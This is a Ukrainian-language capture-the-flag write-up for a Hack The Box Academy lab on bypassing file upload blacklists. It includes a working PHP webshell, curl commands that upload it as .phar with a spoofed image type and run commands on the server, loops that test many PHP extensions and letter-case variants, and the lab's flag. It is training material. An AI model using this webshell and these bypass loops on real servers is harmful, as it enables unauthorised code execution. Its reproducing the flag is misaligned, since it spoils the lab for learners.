## File Uploads — Whitelist Bypass: `.phar` Extension

**Модуль:** [File Upload Attacks](https://academy.hackthebox.com/app/module/136)
**Секція:** [Whitelist Filters](https://academy.hackthebox.com/app/module/136/section/1288)
**Завдання:** Знайти розширення поза blacklist що виконує PHP → `/flag.txt`
**Прапор:** `HTB{1_c4n_n3v3r_b3_bl4ckl1573d}`

***

## Концепція

Сервер має **blacklist** — блокує `.php`, `.phtml`, `.php3-7`, `.pht` тощо. Але `.phar` (PHP Archive) часто забувають додати до списку. Apache виконує `.phar` як PHP якщо є відповідний handler у конфігурації.

***

## Крок 1 — Створити webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

***

## Крок 2 — Тестуємо `.phar`

```bash
TARGET="http://TARGET_IP:PORT"

cp /tmp/shell.php /tmp/shell.phar

curl -s -X POST "$TARGET/upload.php" \
  -F "uploadFile=@/tmp/shell.phar;type=image/gif"
# File successfully uploaded
```

***

## Крок 3 — Верифікація RCE

```bash
curl -s "$TARGET/profile_images/shell.phar?cmd=id"
# uid=33(www-data)
```

***

## Крок 4 — Прапор

```bash
curl -s "$TARGET/profile_images/shell.phar?cmd=cat+/flag.txt"
# HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
```

***

## Повний список PHP-виконуваних розширень для тестування

```bash
TARGET="http://TARGET_IP:PORT"
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

for ext in phtml php2 php3 php4 php5 php6 php7 pht phtm shtml phar; do
  cp /tmp/shell.php /tmp/shell.$ext
  RESP=$(curl -s -X POST "$TARGET/upload.php" \
    -F "uploadFile=@/tmp/shell.$ext;type=image/gif")
  # Якщо прийнято — перевіряємо виконання
  if echo "$RESP" | grep -q "successfully"; then
    RCE=$(curl -s "$TARGET/profile_images/shell.$ext?cmd=id" | grep -o 'uid=[^ <]*')
    echo "$ext: uploaded | RCE: ${RCE:-no}"
  else
    echo "$ext: BLOCKED"
  fi
done
```

***

## Case-Sensitive bypass (якщо blacklist регістрозалежна)

```bash
# Деякі сервери блокують лише lowercase
for name in "shell.PHP" "shell.Php" "shell.pHp" "shell.PHTML" "shell.PhP5"; do
  cp /tmp/shell.php /tmp/${name}
  RESP=$(curl -s -X POST "$TARGET/upload.php" \
    -F "uploadFile=@/tmp/${name};type=image/gif")
  echo "$name: $RESP"
done
```

***

## Blacklist vs Whitelist підхід

| Підхід | Логіка | Слабкість |
|---|---|---|
| **Blacklist** | Блокує відомі небезпечні розширення | Завжди є пропущені варіанти (`.phar`, регістр) |
| **Whitelist** | Дозволяє лише конкретні типи (`.jpg`, `.png`) | Надійніше — але байпас через подвійні розширення |
| **Content-Type check** | Перевіряє MIME type | Легко підмінити через `-F "type=image/gif"` |

***

## Прапор

```
HTB{1_c4n_n3v3r_b3_bl4ckl1573d}
```
